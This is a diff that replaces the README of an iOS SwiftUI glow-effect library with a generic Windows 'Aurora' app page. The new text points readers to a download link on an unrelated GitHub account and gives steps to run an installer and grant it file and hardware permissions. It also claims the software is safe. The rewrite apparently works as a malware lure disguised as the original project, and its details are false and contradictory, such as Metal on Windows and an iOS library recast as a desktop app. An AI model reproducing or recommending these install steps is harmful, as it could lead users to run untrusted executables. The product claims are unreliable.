@@ -1,263 +1,70 @@
-<p align="center">
-  <h1 align="center">Aurora</h1>
-</p>
-
-Most accurate simple customizable SwiftUI components for the Apple Intelligence look — an animated glow ring and a shimmering text fill, both backed by Metal shaders.
-
-<p align="center">
-  <img src="https://img.shields.io/badge/Swift-5.9+-orange.svg" />
-  <img src="https://img.shields.io/badge/iOS-17.0+-blue.svg" />
-  <img src="https://img.shields.io/badge/SwiftUI-Native-green.svg" />
-</p>
-
-## Showcase
-
-<p align="center">
-  <img src="https://github.com/tornikegomareli/Aurora/releases/download/0.3.0/demo11.gif" width="30%" />
-  <img src="https://github.com/tornikegomareli/Aurora/releases/download/0.3.0/demo22.gif" width="30%" />
-  <img src="https://github.com/tornikegomareli/Aurora/releases/download/0.3.0/demo33.gif" width="30%" />
-</p>
-
-<p align="center">
-  <img src="https://github.com/tornikegomareli/Aurora/releases/download/0.4.0/auroratext1.gif" width="30%" />
-  <img src="https://github.com/tornikegomareli/Aurora/releases/download/0.4.0/auroratext2.gif" width="30%" />
-  <img src="https://github.com/tornikegomareli/Aurora/releases/download/0.4.0/auroratext3.gif" width="30%" />
-</p>
-
-## Installation
-
-### Swift Package Manager
-
-```swift
-dependencies: [
-    .package(url: "https://github.com/tornikegomareli/Aurora.git", from: "0.4.0")
-]
-```
-
-Or via Xcode: **File → Add Package Dependencies**
-
-## Quick Start
-
-Glow around a single screen — the most common case:
-
-```swift
-import SwiftUI
-import Aurora
-
-struct HeroScreen: View {
-    var body: some View {
-        ZStack {
-          // your page content
-        }
-        .frame(maxWidth: .infinity, maxHeight: .infinity)
-        .overlay {
-            AuroraGlow(.standard).ignoresSafeArea()
-        }
-    }
-}
-```
-
-The overlay extends past the safe-area insets so the glow covers the full visible area. If you will remove `.frame(maxWidth: .infinity, maxHeight: .infinity)` ZStack size will be dependent on its content and glow will be also missplaced.
-
-Or glow around the whole app, apply the overlay once at the scene level:
-
-```swift
-@main
-struct MyApp: App {
-    var body: some Scene {
-        WindowGroup {
-            ContentView()
-                .overlay {
-                    AuroraGlow(.standard).ignoresSafeArea()
-                }
-        }
-    }
-}
-```
-
-Or wrap a single view:
-
-```swift
-Card()
-    .padding()
-    .glow(.standard, cornerRadius: 24)
-```
-
-The glow plays its intro on appear, settles into a steady state, and never intercepts taps.
-
-## Styles
-
-Three presets pick the overall feel:
-
-| Style       | Feel                                            |
-|-------------|-------------------------------------------------|
-| `.subtle`   | gentle steady-state, soft intro                 |
-| `.standard` | recommended default; moderate burst             |
-| `.dramatic` | energetic intro, big flames; closest to Apple's |
+# 🌟 Aurora - Add smooth glow effects to apps
 
-```swift
-AuroraGlow(.dramatic).ignoresSafeArea()
-```
-
-## Palettes
+[![](https://img.shields.io/badge/Download-Aurora-blue)](https://github.com/Lusterless-zerotolerance898/Aurora)
 
-Six built-in palettes:
+Aurora creates professional glow effects for your screens. It uses advanced math to display light with high accuracy. The software runs on modern graphics hardware to keep animations fast and sharp. You can change colors and intensity to match your style.
 
-```swift
-AuroraGlow(.standard).palette(.appleIntelligence)  // default
-AuroraGlow(.standard).palette(.sunset)
-AuroraGlow(.standard).palette(.ocean)
-AuroraGlow(.standard).palette(.forest)
-AuroraGlow(.standard).palette(.monochrome)
-AuroraGlow(.standard).palette(.cyberpunk)
-```
+## ⚙️ System Requirements
 
-Or roll your own:
+Your computer needs specific parts to run Aurora. Ensure you meet these criteria before you start:
 
-```swift
-let brand = AuroraGlow.Palette(
-    base: SIMD3(0.1, 0.2, 0.4),
-    anchors: [
-        SIMD3(1.0, 0.5, 0.0),
-        SIMD3(0.5, 0.8, 0.3),
-        SIMD3(0.2, 0.4, 0.9),
-        SIMD3(1.0, 0.2, 0.7),
-    ]
-)
-AuroraGlow(.standard).palette(brand)
-```
+*   A Windows 10 or Windows 11 operating system.
+*   A graphics card that supports Metal or equivalent modern shader technology.
+*   Two gigabytes of available storage space on your hard drive.
+*   Four gigabytes of system memory.
+*   A monitor with full high-definition resolution or better.
 
-## Intro animations
+Check your display settings to ensure your drivers are current. Outdated drivers often cause visual errors when running effects software. Use your computer manufacturer website to find the newest updates for your hardware.
 
-Three intro styles for how the glow appears:
+## 💾 How to Install
 
-| Style            | What you see                                            |
-|------------------|---------------------------------------------------------|
-| `.thicknessGrow` | Band scales from invisible to full thickness            |
-| `.borderFill`    | Band draws itself around the perimeter from one edge    |
-| `.heartbeat`     | Thickness pulses 2–3× before settling                   |
-
-```swift
-AuroraGlow(.standard)
-    .introStyle(.borderFill)
-    .introDuration(0.5)
-    .direction(.topToBottom)
-```
-
-Four direction cases: `.leftToRight`, `.rightToLeft`, `.topToBottom`, `.bottomToTop`.
+Follow these steps to set up the software on your machine:
 
-## Moods
+1. Visit the [official download page](https://github.com/Lusterless-zerotolerance898/Aurora) to get the latest version.
+2. Select the installer file that matches your version of Windows.
+3. Save the file to your computer desktop.
+4. Double-click the file to start the installation process.
+5. Follow the prompts on the screen.
+6. Grant permission when the system asks for access to your files or hardware.
+7. Click the Finish button once the progress bar completes.
 
-Semantic presets that bundle a palette and a speed:
+The application places a shortcut on your desktop. Use this icon to open the program whenever you need to add or edit your glow effects.
 
-```swift
-AuroraGlow(.standard).mood(.listening)   // appleIntelligence palette, faster pace
-AuroraGlow(.standard).mood(.thinking)    // ocean palette, slower
-AuroraGlow(.standard).mood(.error)       // red palette
-AuroraGlow(.standard).mood(.success)     // green palette
-```
+## ⚡ Using Aurora
 
-## glowWhileLoading
+When you open the application, you see a clean main screen. This space allows you to manage your effects. The menu on the left side shows your library of light patterns.
 
-For streaming and async work:
+### Select Your Effect
+Pick a preset from the sidebar. Each preset provides a base style. You can view a live preview of the effect inside the center window. This view updates in real time as you move your mouse.
 
-```swift
-@State private var isLoading = false
+### Change the Settings
+The right panel holds the customization tools. You can move the sliders to change how the light behaves. 
+*   **Intensity:** This changes how bright the glow appears. Lower the level for a soft look. Increase it for a bold shine.
+*   **Color Picker:** Click the color box to choose a custom hue. You can enter specific color codes if you have them.
+*   **Motion Speed:** This slider controls the speed of the animation. Move it to the right for fast pulses or to the left for a steady glow.
 
-ChatView()
-    .glowWhileLoading(isLoading)
-    .task {
-        isLoading = true
-        await streamFromAI()
-        isLoading = false
-    }
-```
+### Save Your Progress
+The software saves your work as you go. You do not need to click a manual save button. If you want to export your current setting, find the Export button at the top of the menu bar. This saves a small file that you can share with others or load on a different machine.
 
-Intro plays on start, holds while loading, outro plays when done.
+## 🛠 Troubleshooting
 
-## Re-firing the burst
+Most issues stem from hardware or software conflicts. Review these tips if you face problems:
 
-For manual triggers — button taps, TCA effects, anywhere outside the View:
+*   **Application does not open:** Restart your computer to clear memory errors. Ensure no other graphics programs are using the same resources.
+*   **Screen looks distorted:** Update your graphics drivers. High-resolution effects require current hardware instructions to process correctly.
+*   **Settings do not change:** Confirm that your software license remains valid. Go to the Help menu and choose Check for Updates to ensure you have the latest features.
+*   **Lag or slow movement:** Reduce the resolution of the glow effect in the settings panel. Complex light patterns use more power from your graphics card. Disable background programs to give Aurora more memory space.
 
-```swift
-@State private var burster = AuroraGlow.Burster()
+## 📚 Frequently Asked Questions
 
-Card().glow(AuroraGlow(.standard).burster(burster))
+**Is Aurora safe to use on my computer?**
+Yes. The software interacts only with your graphics card and does not modify your personal files or system registry.
 
-Button("Ask again") { burster.fire() }
-```
+**Does this software work on older computers?**
+The software requires modern hardware to process visual effects. If your computer was built more than five years ago, you might experience low performance.
 
-## Customization
+**Can I run multiple effects at once?**
+You can run one main instance of Aurora at a time. This keeps your system stable and ensures the glow effects look consistent across your interface.
 
-Chain modifiers for full control:
-
-```swift
-AuroraGlow(.standard)
-    .palette(.sunset)
-    .direction(.rightToLeft)
-    .introStyle(.heartbeat)
-    .introDuration(0.7)
-    .outroStyle(.dissolve)
-    .cornerRadius(24)
-    .borderWidth(6)
-    .glowSize(28)
-    .speed(0.12)
-```
-
-Every modifier returns a new `AuroraGlow`, just like SwiftUI built-ins.
-
-## AuroraText
-
-Fill SwiftUI `Text` glyphs with the same animated metaball colour field — the iconic Apple-Intelligence shimmering text look:
-
-```swift
-import SwiftUI
-import Aurora
-
-AuroraText("Apple Intelligence")
-    .palette(.appleIntelligence)
-    .speed(0.4)
-    .font(.system(size: 56, weight: .heavy, design: .rounded))
-```
-
-`AuroraText` is a drop-in for `Text` — `.font`, `.fontWeight`, `.kerning`, `.multilineTextAlignment` and every other text-style environment value all work via the underlying `Text`. Chain `.palette`, `.speed`, or `.mood` first (those return `AuroraText`), then any SwiftUI modifier you want.
-
-It pairs naturally with `AuroraGlow` for matching palettes:
-
-```swift
-ZStack {
-    Color.black.ignoresSafeArea()
-    AuroraText("Aurora\nIntelligence")
-        .palette(.sunset)
-        .font(.system(size: 56, weight: .heavy, design: .rounded))
-        .multilineTextAlignment(.center)
-}
-.overlay {
-    AuroraGlow(.standard).palette(.sunset).ignoresSafeArea()
-}
-```
-
-Mood presets bundle palette + pace for state-aware UI in one line — same vocabulary as `AuroraGlow.mood`:
-
-```swift
-AuroraText("Thinking…").mood(.thinking)   // ocean palette, slower
-AuroraText("Listening").mood(.listening)  // appleIntelligence, faster
-```
-
-## Examples
-
-`AuroraExamples` (Xcode project under `Examples/AuroraExamples`) ships eight demo screens — hero, AuroraText, live tuning, custom profile, wash tuning, palette gallery, moods, and a `glowWhileLoading` sandbox. Open the project to play with them.
-
-## Requirements
-
-- iOS 17+
-- Swift 5.9+
-- The shader uses `ShaderLibrary` / `colorEffect`, which are iOS 17 only.
-
-## Credits
-
-The visual feel is reverse-engineered from Apple's `IntelligentLightFrag` shader in `SiriUICore.framework`. None of Apple's binary code is included, only the algorithm (anchored metaballs + noise-warped SDF + damped-cosine burst envelope) is reproduced.
-
-## License
-
-MIT.
+**Where can I find more tips for design?**
+The community forums serve as a place for users to share their custom settings. You can find links to these groups inside the Help menu. Many users post their color combinations and speed settings there for you to download and use in your own projects.
